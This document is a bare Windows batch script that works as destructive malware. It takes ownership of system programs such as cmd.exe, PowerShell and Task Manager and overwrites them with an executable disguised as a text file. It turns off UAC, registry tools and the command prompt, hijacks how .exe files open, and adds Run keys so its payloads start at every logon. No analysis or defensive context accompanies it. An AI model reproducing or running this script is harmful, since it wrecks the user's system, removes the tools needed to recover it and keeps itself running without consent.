copy devil.txt a.txt
del devil.txt
ren a.txt devil.txt

copy kill.txt a.txt
del kill.txt
ren a.txt kill.txt


ren devil.txt "mesa.exe"
ren "kill.txt" "kill.exe"



takeown /f C:\Windows\System32\taskmgr.exe & icacls C:\Windows\System32\taskmgr.exe /granted "%username%":F & copy mesa.exe "C:\Windows\System32\taskmgr.exe"

takeown /f C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe & icacls C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /granted "%username%":F & copy mesa.exe "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
takeown /f C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe & icacls C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe /granted "%username%":F & copy mesa.exe "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe"
taskkill /f /IM cmd.exe
takeown /f C:\Windows\system32\cmd.exe & icacls C:\Windows\system32\cmd.exe /granted "%username%":F & copy mesa.exe "C:\Windows\system32\cmd.exe"
takeown /f C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe & icacls C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe /granted "%username%":F & copy mesa.exe "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe"
takeown /f C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe & icacls C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe /granted "%username%":F & copy mesa.exe "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
takeown /f C:\Windows\system32\charmap.exe & icacls C:\Windows\system32\charmap.exe /granted "%username%":F & copy mesa.exe "C:\Windows\system32\charmap.exe"

reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
reg add "\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f
reg add HKEY_CLASSES_ROOT\exefile\shell\open\command /d C:\Windows\winnt32.exe"%1"%* /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.exe" /d "txtfile"

set a=%cd%\kill.exe
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "kill" /d  "%a%" /f
set a=%cd%\block\devil.exe"
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "startm" /d  "%a%" /f
copy "block\mesa.exe" "C:\Windows\system"
start ARTE.dll